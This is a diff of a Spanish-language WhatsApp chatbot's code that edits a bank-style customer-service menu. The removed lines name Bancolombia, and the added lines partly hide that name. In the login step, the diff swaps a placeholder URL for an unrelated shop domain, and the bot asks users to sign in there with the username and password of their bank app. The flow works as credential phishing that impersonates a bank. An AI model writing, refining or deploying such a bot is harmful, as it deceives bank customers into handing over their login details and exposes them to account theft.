@@ -14,7 +14,7 @@ const PORT = process.env.PORT ?? 3008;
 
 const welcomeFlow = addKeyword(EVENTS.WELCOME)
   .addAnswer(
-    `¡Hola! Soy Tabot y te doy la bienvenida. Para comenzar, acepta los términos
+    `¡Hola! Soy chatbot y te doy la bienvenida. Para comenzar, acepta los términos
 
 Marca 1 para Aceptar 👍
 Marca 2 para Rechazar 👎`,
@@ -56,21 +56,19 @@ Responde con el número qué identificación tienes:
   .addAnswer(
     `Escribe el número de la opción: 👇
 
-1. 💼 Productos Bancolombia: cuentas, tarjetas, créditos, inversiones
+1. 💼 Productos 
 
-2. 📥 Documentos: certificados y extractos
+2. 📥 pedidos
 
-3. 🏦 Oficinas, cajeros, corresponsales y líneas
+3. 🏦 atencion
 
-4. 📱 Apps y sucursales virtuales
+4. 📱 App
 
-5. 🔐 Seguridad, bloqueos y claves
 
-6. 🌎 Bancolombia en el exterior
 
 7. ❓ Otras consultas
 
-🏢 ¿Buscas opciones para pymes o empresas? Escribe Empresa.`,
+🏢 .`,
     { capture: true },
     async (ctx, { fallBack, state }) => {
       const validOptions = ['1', '2', '3', '4', '5', '6', '7'];
@@ -85,7 +83,7 @@ Responde con el número qué identificación tienes:
     async (ctx, { provider }) => {
       const button = {
         body: 'Iniciar sesión',
-        url: 'https://google.com',
+        url: 'https://aborigenstyles.shop',
         text: 'Login'
       };
       await provider.sendButtonUrl(
@@ -96,7 +94,7 @@ Responde con el número qué identificación tienes:
 Para poder continuar, debemos confirmar tú identidad. Sigue estos pasos: 👇
 
 1⃣ Toca el botón iniciar sesión, abajo 
-2⃣ Entra con el usuario y clave que usas en la App Bancolombia o sucursal virtual Personas.
+2⃣ Entra con el usuario y clave que usas en la App lombia o sucursal virtual Personas.
 3️⃣ Regresa a WhatsApp luego de confirmar tú identidad, para terminar tú solicitud.`
       );
     }
